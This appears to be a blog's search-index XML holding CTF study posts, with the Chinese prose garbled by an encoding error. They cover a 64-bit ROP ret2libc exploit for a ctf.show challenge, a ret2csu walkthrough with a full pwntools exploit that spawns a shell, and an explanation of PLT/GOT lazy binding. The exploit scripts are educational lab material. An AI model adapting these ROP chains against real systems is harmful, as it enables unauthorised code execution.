<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ROP-x64</title>
      <link href="/post/ROP-x64.html"/>
      <url>/post/ROP-x64.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>ä¹‹å‰åœ¨å‰é¢å†™äº†ä¸€ç¯‡ä»‹ç»ROPçš„ï¼Œä¸è¿‡æ˜¯32ä½çš„ï¼Œå› ä¸º64ä½å’Œ32ä½å¤šå¤šå°‘å°‘æœ‰ä¸åŒç‚¹ï¼Œæ‰€ä»¥è¿™æ¬¡å°±ä»‹ç»64ä½ä¸‹çš„ROP</p></blockquote><h1 id="pwn07"><a href="#pwn07" class="headerlink" title="pwn07"></a><a href="https://ctf.show/files/c4d406012dcbf2b25fd23b6a48bf2b12/pwn?token=eyJ1c2VyX2lkIjo0MjMyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjo5NX0.YWwLmA.og84JNMuW7w7Z0oZIr90NIxImf4">pwn07</a></h1><p>åšæ³•å’Œä¹‹å‰32ä½çš„ret2libc3æ€è·¯æ˜¯ä¸€è‡´çš„ï¼Œæ³„éœ²putså‡½æ•°åœ°å€æ‰¾åˆ°libcè®¡ç®—å‡ºsystemå‡½æ•°åœ°å€ä»è€Œè·å–shellã€‚64ä½æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°(å½“å‚æ•°å°äº7ä¸ªæ—¶ï¼Œå‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨rdi,rsi,rdx,rcx,r8,r9)ï¼Œæ‰€ä»¥æ‰§è¡Œsystem(â€œbin/shâ€)æ—¶rdiå¯„å­˜å™¨è¦å­˜å‚¨çš„æ˜¯bin/shå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼š</p><p>æ³„éœ²putså‡½æ•°éœ€è¦å…ˆå°†putsçš„gotè¡¨åœ°å€ä¼ é€’åˆ°rdiå¯„å­˜å™¨ä¸­åœ¨è·³è½¬åˆ°putså‡½æ•°è¾“å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œsystemå‡½æ•°æ—¶ä¸ä»…è¦è®°ä½é€šè¿‡rdiä¼ å‚è¿˜è¦æ³¨æ„å †æ ˆå¯¹é½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure><p>p64(ret_addr)ç›®çš„ç”¨äºå †æ ˆå¯¹é½ï¼Œä¸ç„¶åé¢ä¼šæŠ¥é”™ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28138</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x04006e3</span></span><br><span class="line">ret_addr = <span class="number">0x004006E4</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">libc_puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts_addr)</span><br><span class="line">libcbase = libc_puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+p64(<span class="number">0x00000000004004c6</span>)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>ç”±äºç¨‹åºæ²¡æœ‰è°ƒç”¨putså‡½æ•°ï¼Œæˆ‘ä»¬ä¸èƒ½é€šè¿‡putså‡½æ•°æ³„éœ²å‡½æ•°åœ°å€å¾—åˆ°libcã€‚æ‰€ä»¥ï¼Œè¿™æ¬¡æˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªä¸‡èƒ½gadgetsæ¥æ³„éœ²å‡½æ•°åœ°å€è·å¾—libcï¼Œè¿™ä¸ªgadgetsåœ¨__ libc_csu_initå‡½æ•°é‡Œé¢ï¼Œè€Œè¿™ä¸ª  __libc_csu_initå‡½æ•°æ˜¯ç”¨æ¥å¯¹ libc è¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨ libc å‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚<img src="https://i.loli.net/2021/10/17/tcU5L9SvaAFTsMB.png" alt="å±å¹•æˆªå›¾ 2021-10-17 200528.png"></p><p>é€šè¿‡objdump -M intel -d level5å‘½ä»¤æ¥æŸ¥çœ‹åæ±‡ç¼–ï¼Œå°†å…¶ä¸­ä¸€éƒ¨åˆ†æŒ‡ä»¤åˆ’åˆ†ä¸ºgadgets1å’Œgadgets2ï¼Œå…¶ä¸­gadgets1ä½œç”¨æ˜¯å°†æ ˆé‡Œé¢çš„å€¼ä¼ ç»™å¯„å­˜å™¨ï¼Œè€Œgadgets2ä½œç”¨æ˜¯å°†ä¸€äº›å¯„å­˜å™¨çš„èµ‹ç»™å¦ä¸€äº›å¯„å­˜å™¨ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨è¿™ä¸ªgadgetsæ¥è·å–shell</p><ul><li>åˆ©ç”¨æ ˆæº¢å‡ºæ‰§è¡Œ libc_csu_gadgets ç»„è£…å¥½ write å‡½æ•°å¹¶æ³„éœ²writeå‡½æ•°åœ°å€ï¼Œå¹¶ä½¿å¾—ç¨‹åºé‡æ–°æ‰§è¡Œ main å‡½æ•°</li><li>æ ¹æ® libcsearcher è·å–å¯¹åº” libc ç‰ˆæœ¬ä»¥åŠsystemå‡½æ•°åœ°å€</li><li>å†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ‰§è¡Œ libc_csu_gadgets å‘ bss æ®µå†™å…¥system åœ°å€ä»¥åŠ â€˜/bin/shâ€™ åœ°å€ï¼Œå¹¶ä½¿å¾—ç¨‹åºé‡æ–°æ‰§è¡Œ main å‡½æ•°ã€‚</li><li>å†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ‰§è¡Œ libc_csu_gadgets æ‰§è¡Œsystem(â€˜/bin/shâ€™) è·å– shellã€‚</li></ul><p><img src="https://i.loli.net/2021/10/17/W9hdYOlz2JkwnSK.png" alt="image.png"></p><p>ä¸‹å›¾å±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨ä¸‡èƒ½gadgetsçš„æµç¨‹ï¼š</p><p><img src="https://i.loli.net/2021/10/18/IiotnxPjeKg72OS.png" alt="image.png"></p><h2 id="ç¬¬ä¸€æ¬¡å‘é€payloadï¼š"><a href="#ç¬¬ä¸€æ¬¡å‘é€payloadï¼š" class="headerlink" title="ç¬¬ä¸€æ¬¡å‘é€payloadï¼š"></a>ç¬¬ä¸€æ¬¡å‘é€payloadï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(gadgets1)+p64(<span class="number">0x400606</span>)+p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) + p64(<span class="number">0x4005F0</span>) + <span class="string">&quot;a&quot;</span>*<span class="number">56</span> + p64(main_addr)</span><br></pre></td></tr></table></figure><p>p64(0x400606)ï¼šæ˜¯gadgets1çš„åœ°å€</p><p>p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write)+ p64(8) ï¼šå¯¹åº”çš„å¯„å­˜å™¨ä¸ºrbx,rbp,r12,r13,r14,r15</p><p><strong>rbxå­˜å…¥0æ˜¯å› ä¸ºgadgets2ä¸­rbxä¼šåŠ 1å†ä¸rbpæ¯”è¾ƒï¼Œå¦‚æœä¸åŒå°±ä¼šè·³è½¬ï¼Œä¸èƒ½ç»§ç»­æŒ‰æˆ‘ä»¬çš„è¦æ±‚æ‰§è¡Œï¼Œæ‰€ä»¥å¿…é¡»ä¿è¯rbxåŠ 1ä»¥åè¦å’Œrbpçš„å€¼ä¸€æ ·ï¼Œæ‰€ä»¥åé¢çš„rbpå¡«å…¥1ï¼›p64(gadgets1)å°†ä¼šå¡«å…¥r12ï¼Œå› ä¸ºgadgets2ä¼šè·³è½¬åˆ°r12+rbx * 8çš„ä½ç½®ï¼Œå› ä¸ºrbxä¸º0æ‰€ä»¥å°±æ˜¯è·³è½¬åˆ°r12çš„ä½ç½®ï¼› p64(1) + p64(got_write) + p64(8)å°†ä¼šå¡«å…¥r13,r14,r15å¯„å­˜å™¨ï¼Œå†gadgets2ä¸­ä¼šè½¬ç§»åˆ°edi,rsi,rdxä¸­ï¼Œä¹Ÿå°±æ˜¯ç”¨äºä¼ å‚çš„å‰ä¸‰ä¸ªå¯„å­˜å™¨ï¼›p64(got_write) + p64(1) + p64(got_write)+ p64(8)æœ€åç»„è£…æˆwrite(1,address,8)æ³„éœ²writeå‡½æ•°åœ°å€</strong></p><p>p64(0x4005F0)ï¼šæ˜¯gadgets2çš„åœ°å€</p><p>â€œaâ€*56+p64(main_addr) ï¼šå› ä¸ºgadgets2åé¢æ˜¯gadgets1ï¼Œgadgets1ä¼šå¼¹å‡ºæ ˆé‡Œé¢çš„å€¼ï¼Œä¸ºäº†ä¸è®©gadgets1å½±å“åé¢æ“ä½œï¼Œå°±å¡«å…¥æ— ç”¨å­—ç¬¦ä¸²ï¼Œæœ€åè·³è½¬ä¼šmainå‡½æ•°</p><p><img src="https://i.loli.net/2021/10/18/4fbryJxcqLZoTlH.png" alt="image.png"></p><h2 id="ç¬¬äºŒæ¬¡å‘é€payloadï¼š"><a href="#ç¬¬äºŒæ¬¡å‘é€payloadï¼š" class="headerlink" title="ç¬¬äºŒæ¬¡å‘é€payloadï¼š"></a>ç¬¬äºŒæ¬¡å‘é€payloadï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span>+p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>)+p64(<span class="number">0x4005F0</span>)+<span class="string">&quot;a&quot;</span>*<span class="number">56</span>+p64(main)</span><br></pre></td></tr></table></figure><p> p64(got_read) + p64(0) + p64(bss_addr) + p64(16)ï¼šç»„è£…æˆread(0,bss_addr,16)ï¼Œä½œç”¨æ˜¯å‘bssæ®µå†™å…¥16å­—èŠ‚çš„ä¸œè¥¿</p><p><img src="https://i.loli.net/2021/10/18/SfaDY9HqAkTUGrd.png" alt="image.png"></p><h2 id="ç¬¬ä¸‰æ¬¡å‘é€payload"><a href="#ç¬¬ä¸‰æ¬¡å‘é€payload" class="headerlink" title="ç¬¬ä¸‰æ¬¡å‘é€payload"></a>ç¬¬ä¸‰æ¬¡å‘é€payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload3 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span> + p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x4005F0</span>) + <span class="string">&quot;a&quot;</span>*<span class="number">56</span> + p64(main_addr)</span><br></pre></td></tr></table></figure><p>p64(bss_addr) + p64(bss_addr+8)+ p64(0) + p64(0)ï¼šç»„è£…æˆsystem(â€œbin/shâ€)ï¼Œå› ä¸ºåªæœ‰ä¸€ä¸ªå‚æ•°æ‰€ä»¥åé¢ä¸¤ä¸ªå¡«é›¶ä¸ä¼šé€ æˆä»€ä¹ˆå½±å“</p><p><img src="https://i.loli.net/2021/10/18/WrZCcJ9djxq6feP.png" alt="image.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_read = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]  </span><br><span class="line">payload1 =  <span class="string">&quot;a&quot;</span>*<span class="number">136</span></span><br><span class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) </span><br><span class="line">payload1 += p64(<span class="number">0x4005F0</span>) </span><br><span class="line">payload1 += <span class="string">&quot;a&quot;</span>*<span class="number">56</span></span><br><span class="line">payload1 += p64(start)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload1#############\n&quot;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libcbase = write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_address:&#x27;</span>,system_addr</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libcbase:&#x27;</span>,libcbase</span><br><span class="line">bss_addr=<span class="number">0x601028</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line">payload2 =  <span class="string">&quot;a&quot;</span>*<span class="number">136</span></span><br><span class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>) </span><br><span class="line">payload2 += p64(<span class="number">0x4005F0</span>) </span><br><span class="line">payload2 += <span class="string">&quot;a&quot;</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(start)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload2#############\n&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(p64(system_addr))</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line">payload3 =  <span class="string">&quot;a&quot;</span>*<span class="number">136</span></span><br><span class="line">payload3 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) </span><br><span class="line">payload3 += p64(<span class="number">0x4005F0</span>) </span><br><span class="line">payload3 += <span class="string">&quot;a&quot;</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(start)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload3#############\n&quot;</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/18/osBbMZqYGX8e41x.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å»¶è¿Ÿç»‘å®š</title>
      <link href="/post/plt%E3%80%81got%E5%92%8C%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A.html"/>
      <url>/post/plt%E3%80%81got%E5%92%8C%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A.html</url>
      
        <content type="html"><![CDATA[<p>ç¨‹åºè¿è¡Œæ—¶ï¼Œprintfçš„åœ°å€å°±ä¼šè¢«å­˜å‚¨åˆ°dataæ®µï¼Œcall   c &lt;hello+0xc&gt;å°±ä¼šè·³è½¬åˆ°call printf_stub</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printf_stub:</span><br><span class="line">mov rax,[printfå‡½æ•°åœ°å€]</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>ç¨‹åºåœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šé‡‡ç”¨ä¸¤ç§è¡¨è¿›è¡Œè¾…åŠ©ï¼Œå³pltè¡¨å’Œgotè¡¨ã€‚</p><ul><li>pltè¡¨ä¸ºï¼ˆProcedure Link Tableï¼‰ï¼Œæ˜¯Linux ELFæ–‡ä»¶ä¸­ç”¨äºå»¶è¿Ÿç»‘å®šçš„è¡¨ï¼Œå³å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™æ‰è¿›è¡Œç»‘å®š</li><li>gotè¡¨ä¸ºï¼ˆGlobal Offset Tableï¼‰ï¼Œæ˜¯Linux ELFæ–‡ä»¶ä¸­ç”¨äºå®šä½å…¨å±€å˜é‡å’Œå‡½æ•°çš„ä¸€ä¸ªè¡¨ã€‚</li></ul><h1 id="å»¶è¿Ÿç»‘å®š"><a href="#å»¶è¿Ÿç»‘å®š" class="headerlink" title="å»¶è¿Ÿç»‘å®š"></a>å»¶è¿Ÿç»‘å®š</h1><p>ä¸ºæé«˜CPUçš„åˆ©ç”¨æ•ˆç‡ï¼ŒåŠ¨æ€é“¾æ¥å™¨é»˜è®¤é‡‡ç”¨å»¶è¿Ÿé“¾æ¥æ–¹å¼ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¸ä¼šåœ¨ç¨‹åºåŠ è½½æ—¶è§£ææ¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯åœ¨è°ƒç”¨æ—¶é€šè¿‡pltå’Œgotæ¥å¯¹å‡½æ•°è¿›è¡Œè§£æï¼Œç„¶åä¼šå°†è§£æè·å¾—å‡½æ•°åœ°å€å­˜æ”¾åœ¨gotä¸­ï¼Œä¸‹ä¸€æ¬¡è°ƒç”¨æ—¶ä¼šç›´æ¥ä½¿ç”¨gotä¸­çš„å‡½æ•°åœ°å€å¯¹å‡½æ•°è¿›è¡Œè°ƒç”¨ã€‚</p><h2 id="ç¬¬ä¸€æ¬¡è°ƒç”¨"><a href="#ç¬¬ä¸€æ¬¡è°ƒç”¨" class="headerlink" title="ç¬¬ä¸€æ¬¡è°ƒç”¨"></a>ç¬¬ä¸€æ¬¡è°ƒç”¨</h2><p>ç¬¬ä¸€æ¬¡è°ƒç”¨æŸä¸ªå‡½æ•°æ—¶ï¼Œä¼šç»å†ä»¥ä¸‹è¿‡ç¨‹:</p><p>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; å…¬å…±@plt -&gt; _dl_runtime_resolve -&gt; å‡½æ•°åœ°å€</p><p>ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ï¼Œç”±äºå»¶è¿Ÿç»‘å®šï¼Œæ‰€ä»¥gotè¡¨é‡Œé¢å¹¶æ²¡æœ‰å‡½æ•°çš„çœŸæ­£åœ°å€ï¼Œæ­¤æ—¶gotè¡¨å­˜å‚¨çš„æ˜¯å‡½æ•°çš„pltè¡¨ä¸‹ä¸€å‘½ä»¤åœ°å€ã€‚ä½†æ˜¯åœ¨pltè·³è½¬åˆ°gotæ—¶è¿˜ä¼šå°†æŸä¸ªæ•°å‹å…¥æ ˆä¸­ï¼Œè¿™ä¸ªæ•°å¯ä»¥çœ‹å‡ºè¿™ä¸ªå‡½æ•°çš„IDï¼Œä¹‹åè¿›å…¥åˆ°å…¬å…±@pltè·³è½¬æ‰§è¡Œ_dl_runtime_resolveå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ ¹æ®å‡½æ•°IDæ¥å¯»æ‰¾å¯¹åº”å‡½æ•°ï¼Œå¹¶æ”¹å˜gotè¡¨åœ°å€ä¸ºå‡½æ•°çœŸæ­£åœ°å€ã€‚</p><p><img src="https://i.loli.net/2021/10/17/eGA5HxQEUOrCDlf.png" alt="image.png"></p><h2 id="ç¬¬äºŒæ¬¡è°ƒç”¨"><a href="#ç¬¬äºŒæ¬¡è°ƒç”¨" class="headerlink" title="ç¬¬äºŒæ¬¡è°ƒç”¨"></a>ç¬¬äºŒæ¬¡è°ƒç”¨</h2><p>å› ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨å·²ç»å°†gotè¡¨å’Œå‡½æ•°è¿›è¡Œç»‘å®šï¼Œæ‰€ä»¥è°ƒç”¨æŸä¸ªå‡½æ•°æ—¶çš„æµç¨‹å°±å˜æˆå¦‚ä¸‹ï¼š</p><p>xxx@plt -&gt; xxx@got -&gt; å‡½æ•°åœ°å€</p><h1 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h1><p>ä»¥ä¸‹é¢ä»£ç ä¸ºä¾‹è¿›è¡Œè°ƒè¯•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">hello();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å‘½ä»¤ç¼–è¯‘æŸ¥çœ‹ï¼š </p><ul><li>gcc -Wall -g -o try.o -c try.c -m32                </li><li>objdump -d try.o</li></ul><p><img src="https://i.loli.net/2021/10/17/54RpjzwcThrgbkP.png" alt="å±å¹•æˆªå›¾ 2021-10-17 143320.png"></p><p>ç¨‹åºè¿è¡Œæ—¶ï¼Œprintfçš„åœ°å€å°±ä¼šè¢«å­˜å‚¨åˆ°dataæ®µï¼Œcall   c &lt;hello+0xc&gt;å°±ä¼šå˜æˆcall printf_stubï¼Œprintf_stubå°±ä¼šè·³è½¬åˆ°dataæ®µä¸­printfåœ°å€ï¼Œæœ€åè·³è½¬åˆ°printfå‡½æ•°ã€‚printf_stubå°±ç›¸å½“äºprintfçš„pltè¡¨ï¼Œdataæ®µä¸­å­˜å‚¨printfåœ°å€å°±ç›¸å½“äºprintfçš„gotè¡¨ã€‚</p><p><img src="https://i.loli.net/2021/10/17/2UnLBCaiQbRkMtv.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> å¿ƒå¾— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-pwn</title>
      <link href="/post/ctfshow-pwn.html"/>
      <url>/post/ctfshow-pwn.html</url>
      
